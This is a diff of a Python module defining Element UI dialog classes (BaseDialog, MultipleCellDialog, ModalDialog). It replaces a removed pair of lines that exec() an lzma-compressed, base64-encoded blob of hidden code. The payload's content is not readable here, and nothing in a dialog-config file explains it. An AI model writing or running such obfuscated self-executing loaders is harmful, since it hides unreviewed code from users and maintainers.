@@ -1,2 +1,65 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AWmAfBdADGbCEhj9TzOs41mXS0cKwTXIne2QEcj/lh8shJUuyO7MVHvcNU0weKQDaW2kFNRPzdP5lpb3hHk2Re34+jOIIofZ4Dl/Rgc70uzpyYgllK5g6ACdsRtKFjfQP9iIHxfxRyuyN9nyCBmWUXED6Alz1DhEORUh0u184o9dLdg2eibAqhCn57nSRkqoRPH7eR8GqwVYksLse1QKkTdGSlgiWsDhmOJ8qOYcJqRg3NTC5h7VmQzdIKkJMD5GEyPQgLFnmPv5PJBmZZLcuvlezgOXI7SNacFpysTRpyESlErykjfbvl0Hcyqo1Vb9Zy3nzDoGcE1Ezkd3omZ+e5e6mZwl3vFoAACgfFjkupcalfYk7oUnVLso+t6VgWb6xKUb756SN8vHVxVYTJdzWmb1ggu7nAUwLlOtvXSRj0Miv8f7JW8109r8rPaItw2/57sSEaaaIBCDN9adKDvmWTe5Hnt0rh+jYwrj/uaoGqzrLx1fPXfkudbL1EvP/jnk5NRwE+euqdlBOjxRyx/xAnIXngdpHiXwqEVb8xUOPC+Ww8z8rqgAXtnUDpLQDtdpXT9+zD6ys+w0Als8eLXGVPAbbC7900BlQ7xDVF5lmirydQYOx9Nxj0n0aME3WT+JalWQHnxxhKuLADDfjpAPUvCWnDA5wAAa2PF39wHdHkAAYwEpwsAAONoToOxxGf7AgAAAAAEWVo=')))
+class BaseDialog:
+    title = 'Dialog'
+    width = '500px'
+    height = '300px'
+    show_cancel = True
+
+    cell = '<el-link type="primary">点击查看</el-link>'
+
+    def __init__(self, title=None, width=None, height=None, show_cancel=None,
+                 cell=None):
+        self.title = title or self.title
+        self.width = width or self.width
+        self.height = height or self.height
+        self.show_cancel = show_cancel or self.show_cancel
+        self.cell = cell or self.cell
+
+    def to_dict(self):
+        return {
+            '_type': self.__class__.__name__,
+            'title': self.title,
+            'width': self.width,
+            'height': self.height,
+            'show_cancel': self.show_cancel,
+            'cell': self.cell
+        }
+
+    def __str__(self):
+        return self.cell
+
+
+class MultipleCellDialog(BaseDialog):
+    """
+    单元格中多个modal对话框
+    """
+    modals = []
+
+    def __init__(self, modals):
+        super().__init__()
+        self.modals = modals
+
+    def to_dict(self):
+        return {
+            '_type': self.__class__.__name__,
+            'modals': [m.to_dict() for m in self.modals]
+        }
+
+
+class ModalDialog(BaseDialog):
+    url = None
+
+    def __init__(self, url=None, **kwargs):
+        super(ModalDialog, self).__init__(**kwargs)
+        self.url = url
+
+    def to_dict(self):
+        d = super().to_dict()
+        d['url'] = self.url
+        return d
+
+
+
+
+
+
+
